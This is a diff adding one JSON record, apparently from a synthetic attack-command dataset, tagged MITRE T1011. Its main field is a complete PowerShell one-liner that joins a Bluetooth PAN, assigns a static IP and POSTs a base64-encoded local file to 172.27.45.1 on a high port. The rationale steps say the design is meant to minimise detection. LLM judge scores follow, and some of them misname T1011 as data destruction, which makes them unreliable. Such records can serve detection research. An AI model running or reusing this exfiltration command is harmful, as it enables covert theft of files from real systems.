@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null",
+  "explanation": "Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).",
+  "rationale_steps": [
+    "Activate NAP over Bluetooth as the alternate network medium.",
+    "Assign a restricted /30 IP on the Bluetooth interface with netsh.",
+    "Use HTTP on a high, nonstandard port to minimize detection.",
+    "Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-2f65f9a8",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax including variable assignments, pipeline operations, and proper method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the exfiltration over alternative protocol technique (T1011) by establishing a Bluetooth PAN connection, configuring a static IP, reading a file into base64, and exfiltrating it via HTTP POST to a specific endpoint only accessible through the Bluetooth link.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:49:08.578961Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, valid command separators, and proper parameter usage for all cmdlets and external executables.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration via a Bluetooth PAN, which is completely unrelated to the MITRE ATT&CK technique T1011, 'Data Destruction'; the provided explanation even states it 'exfiltrates data'.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:49:18.441092Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes, valid operators/aliases, proper separators, and parseable hashtable/strings.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly achieves exfiltration over a Bluetooth PAN (T1011) by connecting, setting a static IP, and POSTing base64 data, but it depends on a specific tool/arguments and likely needs admin rights for netsh, and it does not perform data destruction as described.",
+        "combined_score": 4.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-02T02:49:58.075516Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
